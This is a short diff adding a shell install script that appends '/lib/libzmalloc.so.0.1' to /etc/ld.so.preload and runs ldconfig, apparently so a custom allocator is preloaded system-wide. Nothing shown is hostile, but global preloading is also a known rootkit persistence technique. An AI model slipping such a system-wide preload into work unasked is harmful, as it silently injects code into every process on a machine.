@@ -1,0 +1,6 @@
+#!/bin/sh
+
+if ! grep -qs '^/lib/libzmalloc\.so\.0.1$' /etc/ld.so.preload; then
+    echo '/lib/libzmalloc.so.0.1' >>/etc/ld.so.preload &&
+    /sbin/ldconfig
+fi
